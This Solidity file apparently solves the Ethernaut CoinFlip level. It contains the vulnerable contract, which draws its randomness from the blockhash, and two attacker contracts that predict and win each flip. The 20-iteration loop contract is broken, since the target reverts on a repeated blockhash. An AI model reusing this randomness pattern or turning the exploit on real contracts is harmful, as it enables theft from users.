// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";
//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipHack{
    CoinFlip coinFlipContract;
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipContract) public {
        coinFlipContract = _coinFlipContract;
    }

    function guessFlip() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return coinFlipContract.flip(side);
    }
}

contract CoinFlipHackLoop{
    CoinFlip coinFlipContract;
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    event coinFlipped(bool side, bool result);

    constructor(CoinFlip _coinFlipContract) public {
        coinFlipContract = _coinFlipContract;
    }

    function guessFlip20() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        bool coinFlipGuessResult;
        
        for (uint i = 0; i < 20; i++){
            coinFlipGuessResult = coinFlipContract.flip(side);
            emit coinFlipped(side,coinFlipGuessResult);
        }
    }
}